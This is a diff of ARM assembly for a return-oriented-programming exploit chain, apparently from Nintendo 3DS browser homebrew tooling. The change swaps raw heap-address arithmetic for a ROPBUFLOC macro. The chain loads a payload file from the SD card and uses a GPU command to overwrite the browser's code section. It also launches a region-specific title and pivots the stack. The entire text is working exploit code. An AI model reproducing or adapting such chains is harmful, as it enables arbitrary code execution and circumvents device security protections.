-CALLFUNC_NOSP IFile_Open, (HEAPBUF + (IFile_ctx - _start)), (HEAPBUF + (sdfile_path - _start)), 1, 0
+CALLFUNC_NOSP IFile_Open, ROPBUFLOC(IFile_ctx), ROPBUFLOC(sdfile_path), 1, 0
 COND_THROWFATALERR
 
-CALLFUNC_NOSP IFile_Read, (HEAPBUF + (IFile_ctx - _start)), (HEAPBUF + (tmp_scratchdata - _start)), (HEAPBUF + (codebinpayload_start - _start)), (CODEBINPAYLOAD_SIZE - (codebinpayload_start - codedatastart))
+CALLFUNC_NOSP IFile_Read, ROPBUFLOC(IFile_ctx), ROPBUFLOC(tmp_scratchdata), ROPBUFLOC(codebinpayload_start), (CODEBINPAYLOAD_SIZE - (codebinpayload_start - codedatastart))
 COND_THROWFATALERR
 
 ROP_SETLR ROP_POPPC
 
 .word POP_R0PC
-.word (HEAPBUF + (IFile_ctx - _start))
+.word ROPBUFLOC(IFile_ctx)
 
 .word ROP_LDR_R0FROMR0
 
 .word IFile_Close
 #endif
 
-CALLFUNC_NOSP GSPGPU_FlushDataCache, (HEAPBUF + (codedatastart - _start)), CODEBINPAYLOAD_SIZE, 0, 0
+CALLFUNC_NOSP GSPGPU_FlushDataCache, ROPBUFLOC(codedatastart), CODEBINPAYLOAD_SIZE, 0, 0
 
 ROP_SETLR POP_R2R6PC
 
 .word POP_R0PC
-.word HEAPBUF + (region_outval - _start) @ r0
+.word ROPBUFLOC(region_outval) @ r0
 
 .word CFGIPC_SecureInfoGetRegion @ Write the SecureInfo region value to the below field which will be popped into r4.
 
@@ -587,11 +591,11 @@ ROP_SETLR POP_R2R6PC
 .word 0 @ r3
 region_outval:
 .word 0 @ r4
-.word HEAPBUF + (nsslaunchtitle_programidlow_list - _start) @ r5
+.word ROPBUFLOC(nsslaunchtitle_programidlow_list) @ r5
 .word 0 @ r6
 
 .word POP_R0PC
-.word HEAPBUF + (object - _start) @ r0
+.word ROPBUFLOC(object) @ r0
 
 .word ROP_LDRR1_FROMR5ARRAY_R4WORDINDEX //"ldr r1, [r5, r4, lsl #2]" <call vtable funcptr +20 from the r0 object> (load the programID-low for this region into r1)
 
@@ -599,14 +603,14 @@ ROP_SETLR_OTHER ROP_POPPC
 
 .word POP_R0PC
 
-.word HEAPBUF + (nsslaunchtitle_regload_programidlow - _start) @ r0
+.word ROPBUFLOC(nsslaunchtitle_regload_programidlow) @ r0
 
 .word ROP_STR_R1TOR0 //Write the programID-low value for this region to the below reg-data which would be used for the programID-low in the NSS_LaunchTitle call.
 
 ROP_SETLR POP_R2R6PC
 
 .word POP_R0PC
-.word HEAPBUF + (nss_outprocid - _start)  @ r0, out procid*
+.word ROPBUFLOC(nss_outprocid) @ r0, out procid*
 
 @ r1 isn't used by NSS_LaunchTitle so no need to set it here.
 
@@ -631,10 +635,10 @@ CALLFUNC ROP_INITOBJARRAY, 0, ROP_BXLR, 0, 0x10000000, 0, 0, 0, 0
 #endif
 
 //Overwrite the browser .text with the below code.
-CALL_GXCMD4 (HEAPBUF + (codedatastart - _start)), NSS_PROCLOADTEXT_LINEARMEMADR, CODEBINPAYLOAD_SIZE
+CALL_GXCMD4 ROPBUFLOC(codedatastart), NSS_PROCLOADTEXT_LINEARMEMADR, CODEBINPAYLOAD_SIZE
 
 /*#if NEW3DS==1 //Free the memory which was allocated above on new3ds.
-CALLFUNC svcControlMemory, (HEAPBUF + (tmp_scratchdata - _start)), 0x0f000000, 0, 0x00400000, 0x1, 0x0, 0, 0
+CALLFUNC svcControlMemory, ROPBUFLOC(tmp_scratchdata), 0x0f000000, 0, 0x00400000, 0x1, 0x0, 0, 0
 #endif*/
 
 #if NEW3DS==1//Use this as a waitbyloop.
@@ -655,7 +659,7 @@ CALLFUNC_NOARGS GSPGPU_Shutdown
 
 /*
 //Get "ns:s" service handle, then send it via APT_SendParameter(). The codebin payload can then use APT:ReceiveParameter to get this "ns:s" handle.
-CALLFUNC_NOSP SRV_GETSERVICEHANDLE, (HEAPBUF + (aptsendparam_handle - _start)), (HEAPBUF + (nss_servname - _start)), 0x4, 0
+CALLFUNC_NOSP SRV_GETSERVICEHANDLE, ROPBUFLOC(aptsendparam_handle), ROPBUFLOC(nss_servname), 0x4, 0
 
 ROP_SETLR POP_R2R6PC
 .word POP_R0PC
@@ -713,7 +717,7 @@ ROP_SETLR ROP_POPPC
 
 .word svcSleepThread
 
-ROPMACRO_STACKPIVOT (HEAPBUF + (ropfinish_sleepthread - _start)), ROP_POPPC
+ROPMACRO_STACKPIVOT ROPBUFLOC(ropfinish_sleepthread), ROP_POPPC
 
 .word POP_R1PC
 .word ROP_BXR1 @ r1
